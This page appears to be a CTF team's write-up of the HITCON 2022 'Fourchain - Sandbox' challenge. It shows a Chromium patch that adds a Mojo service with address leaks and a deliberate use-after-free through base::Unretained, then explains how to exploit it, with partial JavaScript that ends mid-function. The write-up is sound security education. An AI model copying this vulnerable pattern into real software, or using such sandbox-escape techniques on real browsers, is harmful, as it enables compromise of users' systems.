<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Fourchain - Sandbox | Organisers</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Fourchain - Sandbox" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CTF Team" />
<meta property="og:description" content="CTF Team" />
<link rel="canonical" href="https://org.anize.rs/HITCON-2022/pwn/fourchain-sandbox.html" />
<meta property="og:url" content="https://org.anize.rs/HITCON-2022/pwn/fourchain-sandbox.html" />
<meta property="og:site_name" content="Organisers" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Fourchain - Sandbox" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Fourchain - Sandbox","url":"https://org.anize.rs/HITCON-2022/pwn/fourchain-sandbox.html"}</script>
<!-- End Jekyll SEO tag -->


    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
    <meta name="twitter:card" content="summary" />
    <!-- TODO <meta name="twitter:description" content="" /> -->
    <meta name="twitter:title" content="Organisers" />
    <meta name="twitter:site" content="@0rganizers" />
    <!-- TODO <meta name="twitter:image" content="" /> -->

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#040d21">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Hack monospace font -->
    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">

    <!-- legitimize current Mastodon profile via link verification -->
    <link rel="me" href="https://infosec.exchange/@organizers" />


    <script type="text/javascript">
        function isLightThemeSelected() {
          return document.cookie.match(/theme=light/i) != null
        }

        function setThemeFromCookie() {
            var html = document.getElementsByTagName('html')[0]
            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
            console.log('Loaded cookie: ' + document.cookie)
        }

        (function() {
          setThemeFromCookie()
        })();
    </script>

    <script type="text/javascript">
        function getFootnoteContent(linkId) {
            const fnId = linkId.replace(/^fnref/, 'fn');
            return document.getElementById(fnId).querySelector("p").innerHTML;
        }

        function addFootnote(element, content) {
            const footnote = document.createElement('div');
            footnote.classList.add('footnote-box');
            // Also add the footnote number
            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
                footnote.removeChild(backlink);
            });
            element.insertAdjacentElement('afterend', footnote);
            element.dataset.toggled = '1';
        }

        function removeFootnote(element) {
            element.parentElement.removeChild(element.nextSibling);
            element.dataset.toggled = '0';
        }


        window.addEventListener("load", function() {
            document.querySelectorAll("a.footnote").forEach((el) => {
                const sup = el.parentElement;
                el.addEventListener("click", (event) => {
                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
                    if (!isOpen) {
                        addFootnote(sup, getFootnoteContent(sup.id));
                    } else {
                        removeFootnote(sup);
                    }
                    event.preventDefault();
                });
            });
        });
    </script>

    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      "HTML-CSS": {
        fonts: ["Gyre-Pagella"],
        imageFont: null,
        undefinedFamily: "'Arial Unicode MS', cmbright"
      },
      tex2jax: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        processEscapes: true
      }
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
  </head>
  
  <body> 
    <header class="page-header-simple" role="banner">
      
      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
      <div class="right-links">
        <a href="/writeups">Writeups</a>
        <a href="/achievements">Achievements</a>
      </div>
    </header>

    <main id="content" class="main-content" role="main">
      <h1 id="fourchain---sandbox">Fourchain - Sandbox</h1>

<p><strong>Authors:</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>

<p><strong>Tags:</strong> pwn, browser, sandbox</p>

<p><strong>Points:</strong> 384</p>

<blockquote>
  <p>Pouring sand into boxes ? How boring is that 🥱</p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p>In this challenge the authors open a webpage with contents controlled by us with a vulnerable version of Chromium. The challenge simulates a compromised renderer process by giving JavaScript code access to Chromium’s Mojo IPC (<code class="language-plaintext highlighter-rouge">--enable-blink-features=MojoJS</code>) and the flag is in a file that is not accessible from inside the sandbox. This means that we have to find a way to escape the sandbox by using the Mojo APIs.</p>

<p>As with the V8 challenge, we are given a patch that introduces the vulnerability that we have to exploit:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/content/browser/BUILD.gn b/content/browser/BUILD.gn
index 0e81bb6da44ce..ba8af9ad8a3a9 100644
</span><span class="gd">--- a/content/browser/BUILD.gn
</span><span class="gi">+++ b/content/browser/BUILD.gn
</span><span class="p">@@ -2282,6 +2282,8 @@</span> source_set("browser") {
     "worker_host/worker_script_loader.h",
     "worker_host/worker_script_loader_factory.cc",
     "worker_host/worker_script_loader_factory.h",
<span class="gi">+    "sandbox/sandbox_impl.h",
+    "sandbox/sandbox_impl.cc",
</span>   ]
 
   # TODO(crbug.com/1327384): Remove `permissions_common`.
<span class="gh">diff --git a/content/browser/browser_interface_binders.cc b/content/browser/browser_interface_binders.cc
index d0e12faf3f16a..0f599997dbb5f 100644
</span><span class="gd">--- a/content/browser/browser_interface_binders.cc
</span><span class="gi">+++ b/content/browser/browser_interface_binders.cc
</span><span class="p">@@ -14,6 +14,7 @@</span>
 #include "build/branding_buildflags.h"
 #include "build/build_config.h"
 #include "cc/base/switches.h"
<span class="gi">+#include "content/browser/sandbox/sandbox_impl.h"
</span> #include "content/browser/aggregation_service/aggregation_service_internals.mojom.h"
 #include "content/browser/aggregation_service/aggregation_service_internals_ui.h"
 #include "content/browser/attribution_reporting/attribution_internals.mojom.h"
<span class="p">@@ -110,6 +111,7 @@</span>
 #include "storage/browser/quota/quota_manager_proxy.h"
 #include "third_party/blink/public/common/features.h"
 #include "third_party/blink/public/common/storage_key/storage_key.h"
<span class="gi">+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
</span> #include "third_party/blink/public/mojom/background_fetch/background_fetch.mojom.h"
 #include "third_party/blink/public/mojom/background_sync/background_sync.mojom.h"
 #include "third_party/blink/public/mojom/blob/blob_url_store.mojom.h"
<span class="p">@@ -982,6 +984,8 @@</span> void PopulateFrameBinders(RenderFrameHostImpl* host, mojo::BinderMap* map) {
   map-&gt;Add&lt;blink::mojom::RenderAccessibilityHost&gt;(
       base::BindRepeating(&amp;RenderFrameHostImpl::BindRenderAccessibilityHost,
                           base::Unretained(host)));
<span class="gi">+  map-&gt;Add&lt;blink::mojom::Sandbox&gt;(base::BindRepeating(
+      &amp;RenderFrameHostImpl::CreateSandbox, base::Unretained(host)));
</span> }
 
 void PopulateBinderMapWithContext(
<span class="gh">diff --git a/content/browser/renderer_host/render_frame_host_impl.cc b/content/browser/renderer_host/render_frame_host_impl.cc
index 142c6d093d80a..9f12815bf1def 100644
</span><span class="gd">--- a/content/browser/renderer_host/render_frame_host_impl.cc
</span><span class="gi">+++ b/content/browser/renderer_host/render_frame_host_impl.cc
</span><span class="p">@@ -2004,6 +2004,11 @@</span> RenderFrameHostImpl::~RenderFrameHostImpl() {
   TRACE_EVENT_END("navigation", perfetto::Track::FromPointer(this));
 }
 
<span class="gi">+void RenderFrameHostImpl::CreateSandbox(
+    mojo::PendingReceiver&lt;blink::mojom::Sandbox&gt; receiver) {
+  SandboxImpl::Create(std::move(receiver));
+}
+
</span> int RenderFrameHostImpl::GetRoutingID() const {
   return routing_id_;
 }
<span class="gh">diff --git a/content/browser/renderer_host/render_frame_host_impl.h b/content/browser/renderer_host/render_frame_host_impl.h
index c9c0155bc626e..11329de446f78 100644
</span><span class="gd">--- a/content/browser/renderer_host/render_frame_host_impl.h
</span><span class="gi">+++ b/content/browser/renderer_host/render_frame_host_impl.h
</span><span class="p">@@ -37,6 +37,7 @@</span>
 #include "base/types/pass_key.h"
 #include "base/unguessable_token.h"
 #include "build/build_config.h"
<span class="gi">+#include "content/browser/sandbox/sandbox_impl.h"
</span> #include "content/browser/accessibility/browser_accessibility_manager.h"
 #include "content/browser/accessibility/web_ax_platform_tree_manager_delegate.h"
 #include "content/browser/bad_message.h"
<span class="p">@@ -140,6 +141,7 @@</span>
 #include "third_party/blink/public/mojom/portal/portal.mojom-forward.h"
 #include "third_party/blink/public/mojom/presentation/presentation.mojom-forward.h"
 #include "third_party/blink/public/mojom/render_accessibility.mojom.h"
<span class="gi">+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
</span> #include "third_party/blink/public/mojom/security_context/insecure_request_policy.mojom-forward.h"
 #include "third_party/blink/public/mojom/sms/webotp_service.mojom-forward.h"
 #include "third_party/blink/public/mojom/speech/speech_synthesis.mojom-forward.h"
<span class="p">@@ -1815,6 +1817,9 @@</span> class CONTENT_EXPORT RenderFrameHostImpl
   // Returns true if the frame is frozen.
   bool IsFrozen();
 
<span class="gi">+  void CreateSandbox(
+      mojo::PendingReceiver&lt;blink::mojom::Sandbox&gt; receiver);
+
</span>   // Set the `frame_` for sending messages to the renderer process.
   void SetMojomFrameRemote(mojo::PendingAssociatedRemote&lt;mojom::Frame&gt;);
 
<span class="gh">diff --git a/content/browser/sandbox/sandbox_impl.cc b/content/browser/sandbox/sandbox_impl.cc
</span><span class="p">new file mode 100644
</span><span class="gh">index 0000000000000..b03840e655d7d
</span><span class="gd">--- /dev/null
</span><span class="gi">+++ b/content/browser/sandbox/sandbox_impl.cc
</span><span class="p">@@ -0,0 +1,59 @@</span>
<span class="gi">+#include "content/browser/sandbox/sandbox_impl.h"
+#include "mojo/public/cpp/bindings/self_owned_receiver.h"
+#include "content/public/browser/browser_task_traits.h"
+#include "content/public/browser/browser_thread.h"
+
+namespace content {
+
+    size_t SandboxImpl::cnt = 0;
+
+    SandboxImpl::SandboxImpl() {
+        this-&gt;isProcess_ = false;
+        this-&gt;id_ = SandboxImpl::cnt;
+        SandboxImpl::cnt++;
+        memset(this-&gt;box_, 0, sizeof(this-&gt;box_));
+    }
+
+    SandboxImpl::~SandboxImpl() {
+        SandboxImpl::cnt--;
+    }
+
+    // static
+    void SandboxImpl::Create(
+        mojo::PendingReceiver&lt;blink::mojom::Sandbox&gt; receiver) {
+      auto self = std::make_unique&lt;SandboxImpl&gt;();
+      mojo::MakeSelfOwnedReceiver(std::move(self), std::move(receiver));
+    }
+
+    void SandboxImpl::GetTextAddress(GetTextAddressCallback callback) {
+        std::move(callback).Run((uint64_t)(&amp;SandboxImpl::Create));
+    }
+
+    void SandboxImpl::GetHeapAddress(GetHeapAddressCallback callback) {
+        std::move(callback).Run((uint64_t)(this));
+    }
+
+    void SandboxImpl::PourSand(const std::vector&lt;uint8_t&gt;&amp; sand) {
+        if ( this-&gt;isProcess_ || sand.size() &gt; 0x1100 )  return;
+
+        this-&gt;isProcess_ = true;
+        content::GetIOThreadTaskRunner({})-&gt;PostTask(
+            FROM_HERE,  
+            base::BindOnce(&amp;SandboxImpl::Pour, base::Unretained(this), sand)
+        );
+    }
+
+    void SandboxImpl::Pour(const std::vector&lt;uint8_t&gt;&amp; sand) {
+        size_t sand_sz = sand.size(), i = 0;
+        if (sand_sz &gt; 0x800) {
+            std::vector&lt;uint8_t&gt; sand_for_box(sand.begin(), sand.begin()+0x800);
+            this-&gt;backup_ = std::make_unique&lt;std::vector&lt;uint8_t&gt;&gt;(sand.begin()+0x800, sand.end());
+            this-&gt;PourSand(sand_for_box);
+        } else {
+            for ( i = 0 ; i &lt; sand_sz ; i++) {
+                this-&gt;box_[i] = sand[i];
+            }
+        }
+        this-&gt;isProcess_ = false;
+    }
+} // namespace content
</span><span class="gh">diff --git a/content/browser/sandbox/sandbox_impl.h b/content/browser/sandbox/sandbox_impl.h
</span><span class="p">new file mode 100644
</span><span class="gh">index 0000000000000..81affb5a7f7dc
</span><span class="gd">--- /dev/null
</span><span class="gi">+++ b/content/browser/sandbox/sandbox_impl.h
</span><span class="p">@@ -0,0 +1,33 @@</span>
<span class="gi">+#ifndef CONTENT_BROWSER_SANDBOX_IMPL_H_
+#define CONTENT_BROWSER_SANDBOX_IMPL_H_
+
+#include &lt;cstdint&gt;
+#include &lt;iostream&gt;
+
+#include "content/common/content_export.h"
+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
+
+namespace content {
+
+    class CONTENT_EXPORT SandboxImpl : public blink::mojom::Sandbox {
+        public:
+            static size_t cnt;
+            SandboxImpl();
+            ~SandboxImpl() override;
+            static void Create(
+                    mojo::PendingReceiver&lt;blink::mojom::Sandbox&gt; receiver);
+
+            void GetTextAddress(GetTextAddressCallback callback) override;
+            void GetHeapAddress(GetHeapAddressCallback callback) override;
+            void PourSand(const std::vector&lt;uint8_t&gt;&amp; sand) override;
+
+        private:
+            void Pour(const std::vector&lt;uint8_t&gt;&amp; sand);
+            size_t id_;
+            bool isProcess_;
+            uint8_t box_[0x800];
+            std::unique_ptr&lt;std::vector&lt;uint8_t&gt;&gt; backup_; 
+    };
+}  // namespace content
+
+#endif
</span><span class="gh">diff --git a/third_party/blink/public/mojom/BUILD.gn b/third_party/blink/public/mojom/BUILD.gn
index 92fac884e82f5..6678a9d9876ac 100644
</span><span class="gd">--- a/third_party/blink/public/mojom/BUILD.gn
</span><span class="gi">+++ b/third_party/blink/public/mojom/BUILD.gn
</span><span class="p">@@ -228,6 +228,7 @@</span> mojom("mojom_platform") {
     "worker/worker_content_settings_proxy.mojom",
     "worker/worker_main_script_load_params.mojom",
     "worker/worker_options.mojom",
<span class="gi">+    "sandbox/sandbox.mojom",
</span>   ]
 
   if (is_android) {
<span class="gh">diff --git a/third_party/blink/public/mojom/sandbox/sandbox.mojom b/third_party/blink/public/mojom/sandbox/sandbox.mojom
</span><span class="p">new file mode 100644
</span><span class="gh">index 0000000000000..030ce033b377e
</span><span class="gd">--- /dev/null
</span><span class="gi">+++ b/third_party/blink/public/mojom/sandbox/sandbox.mojom
</span><span class="p">@@ -0,0 +1,7 @@</span>
<span class="gi">+module blink.mojom;
+
+interface Sandbox {
+    GetTextAddress() =&gt; (uint64 addr);
+    GetHeapAddress() =&gt; (uint64 addr);
+    PourSand(array&lt;uint8&gt; sand);
+};
</span></code></pre></div></div>

<p>We can see that the author added a new Mojo service that our exploit can access from the compromised renderer. The service exposes 3 methods to the renderer: <code class="language-plaintext highlighter-rouge">GetTextAddress</code>, <code class="language-plaintext highlighter-rouge">GetHeapAddress</code>, and <code class="language-plaintext highlighter-rouge">PourSand</code>. We can invoke these methods and get their results from JavaScript, after importing the JavaScript bindings.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface Sandbox {
    GetTextAddress() =&gt; (uint64 addr);
    GetHeapAddress() =&gt; (uint64 addr);
    PourSand(array&lt;uint8&gt; sand);
};
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>

<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/mojo_bindings.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="kd">let</span> <span class="nx">printbuf</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">printbuf</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">uploadLogs</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://chain.galli.me:8080/logs</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">body</span><span class="p">:</span> <span class="nx">printbuf</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">),</span>
  <span class="p">});</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s2">`0x</span><span class="p">${</span><span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">SandboxPtr</span><span class="p">();</span>
  <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">Sandbox</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">).</span><span class="nx">handle</span><span class="p">);</span>
  <span class="nx">print</span><span class="p">(</span><span class="s2">`Result: </span><span class="p">${</span><span class="nx">hex</span><span class="p">((</span><span class="k">await</span> <span class="nx">sandbox</span><span class="p">.</span><span class="nx">getHeapAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

  <span class="k">await</span> <span class="nx">uploadLogs</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">pwn</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Result: 0x16f8003f1600
</code></pre></div></div>

<p>The implementations of the first two methods are straightforward and only give us some “free” pointer leaks:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">SandboxImpl</span><span class="o">::</span><span class="n">GetTextAddress</span><span class="p">(</span><span class="n">GetTextAddressCallback</span> <span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">SandboxImpl</span><span class="o">::</span><span class="n">Create</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">SandboxImpl</span><span class="o">::</span><span class="n">GetHeapAddress</span><span class="p">(</span><span class="n">GetHeapAddressCallback</span> <span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="k">this</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The implementation of <code class="language-plaintext highlighter-rouge">PourSand</code> is the interesting part:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">SandboxImpl</span><span class="o">::</span><span class="n">PourSand</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;&amp;</span> <span class="n">sand</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">isProcess_</span> <span class="o">||</span> <span class="n">sand</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mh">0x1100</span> <span class="p">)</span>  <span class="k">return</span><span class="p">;</span>
    <span class="k">this</span><span class="o">-&gt;</span><span class="n">isProcess_</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">content</span><span class="o">::</span><span class="n">GetIOThreadTaskRunner</span><span class="p">({})</span><span class="o">-&gt;</span><span class="n">PostTask</span><span class="p">(</span>
        <span class="n">FROM_HERE</span><span class="p">,</span>  
        <span class="n">base</span><span class="o">::</span><span class="n">BindOnce</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SandboxImpl</span><span class="o">::</span><span class="n">Pour</span><span class="p">,</span> <span class="n">base</span><span class="o">::</span><span class="n">Unretained</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="n">sand</span><span class="p">)</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">SandboxImpl</span><span class="o">::</span><span class="n">Pour</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;&amp;</span> <span class="n">sand</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">sand_sz</span> <span class="o">=</span> <span class="n">sand</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sand_sz</span> <span class="o">&gt;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span> <span class="n">sand_for_box</span><span class="p">(</span><span class="n">sand</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">sand</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mh">0x800</span><span class="p">);</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">backup_</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">sand</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">sand</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
        <span class="k">this</span><span class="o">-&gt;</span><span class="n">PourSand</span><span class="p">(</span><span class="n">sand_for_box</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sand_sz</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="o">-&gt;</span><span class="n">box_</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">sand</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">this</span><span class="o">-&gt;</span><span class="n">isProcess_</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The first thing that stands out is that <code class="language-plaintext highlighter-rouge">PourSand</code> doesn’t directly call <code class="language-plaintext highlighter-rouge">Pour</code> and instead posts a task that runs <code class="language-plaintext highlighter-rouge">Pour</code> to the I/O thread’s task queue and returns immediately. This means that <code class="language-plaintext highlighter-rouge">Pour</code> might only be called later, after <code class="language-plaintext highlighter-rouge">PourSand</code> returns, if the I/O thread is busy. This creates some object lifetime issues: what if the <code class="language-plaintext highlighter-rouge">SandboxImpl</code> instance (or <code class="language-plaintext highlighter-rouge">sand</code>) is gone by the time the task is executed? The code needs to make sure that both remain alive at least until <code class="language-plaintext highlighter-rouge">Pour</code> finishes executing.</p>

<p>The <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/callback.md#how-the-implementation-works">chromium docs for <code class="language-plaintext highlighter-rouge">BindOnce</code></a> say this about lifetime management:</p>

<blockquote>
  <p>By default base::Bind{Once, Repeating}() will store copies of all bound parameters, and attempt to refcount a target object if the function being bound is a class method. These copies are created even if the function takes parameters as const references.</p>

  <p>To change this behavior, we introduce a set of argument wrappers (e.g., base::Unretained()). These are simple container templates that are passed by value, and wrap a pointer to argument. Each helper has a comment describing it in base/bind.h.</p>
</blockquote>

<p>So it appears that the contents of <code class="language-plaintext highlighter-rouge">sand</code> are copied and the copy is passed to <code class="language-plaintext highlighter-rouge">Pour</code> because <code class="language-plaintext highlighter-rouge">sand</code> is a const reference. But what about <code class="language-plaintext highlighter-rouge">this</code>? According to the documentation the default behavior would be to increment its refcount, but here the code is using <code class="language-plaintext highlighter-rouge">base::Unretained</code> which changes this. Let’s check chromium’s documentation for that:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Unretained() allows binding a non-refcounted class, and to disable</span>
<span class="c1">// refcounting on arguments that are refcounted objects.</span>
</code></pre></div></div>

<blockquote>
  <p>If a callback bound to a class method does not need cancel-on-destroy semantics (because there is some external guarantee that the class instance will always be live when running the callback), then use base::Unretained(). It is often a good idea to add a brief comment to explain why base::Unretained() is safe in this context; if nothing else, for future code archaeologists trying to fix a use-after-free bug.</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">base::Unretained</code> disables refcounting and represents a promise from the caller that the object will remain alive until the callback finally runs. As the documentation notes, it can cause a use-after-free if not used carefully, and it looks like the challenge code might be vulnerable to this. This gives us a potential use-after-free on a <code class="language-plaintext highlighter-rouge">SandboxImpl</code>.</p>

<h2 id="exploitation">Exploitation</h2>

<p>In order to exploit the vulnerability the following things would have to happen, in order:</p>

<ol>
  <li>
    <p>Our exploit calls <code class="language-plaintext highlighter-rouge">PourSand</code> on a <code class="language-plaintext highlighter-rouge">SandboxImpl</code> (let’s call this <code class="language-plaintext highlighter-rouge">a</code>). This enqueues the call to <code class="language-plaintext highlighter-rouge">a-&gt;Pour</code> on the I/O thread.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">a</code> gets freed.</p>
  </li>
  <li>
    <p>Our exploit reclaims <code class="language-plaintext highlighter-rouge">a</code>’s memory with a different object whose contents we control.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Pour</code> runs with <code class="language-plaintext highlighter-rouge">this</code> pointing to controlled memory.</p>
  </li>
</ol>

<p>Freeing <code class="language-plaintext highlighter-rouge">a</code> is easy, we can do it from JavaScript by calling <code class="language-plaintext highlighter-rouge">.reset()</code> on the handle.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">SandboxPtr</span><span class="p">();</span>
<span class="c1">// Free the SandboxImpl</span>
<span class="nx">sandbox</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
</code></pre></div></div>

<p>Spraying should also be pretty easy because <code class="language-plaintext highlighter-rouge">Pour</code> conveniently creates a <code class="language-plaintext highlighter-rouge">std::vector&lt;uint8_t&gt;</code> with controlled data and size when <code class="language-plaintext highlighter-rouge">sand</code> is bigger than 0x800 bytes. All we need is a way to delay the execution of a freed <code class="language-plaintext highlighter-rouge">SandboxImpl</code>’s <code class="language-plaintext highlighter-rouge">Pour</code> callback. One idea is to post a lot of tasks to the I/O thread by calling <code class="language-plaintext highlighter-rouge">PourSand</code> over and over, and then free our target while the I/O thread is busy processing the callbacks:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">newClient</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">SandboxPtr</span><span class="p">();</span>
  <span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">Sandbox</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">iface</span><span class="p">).</span><span class="nx">handle</span><span class="p">);</span>

  <span class="k">return</span> <span class="nx">iface</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">clients</span> <span class="o">=</span> <span class="p">[];</span>
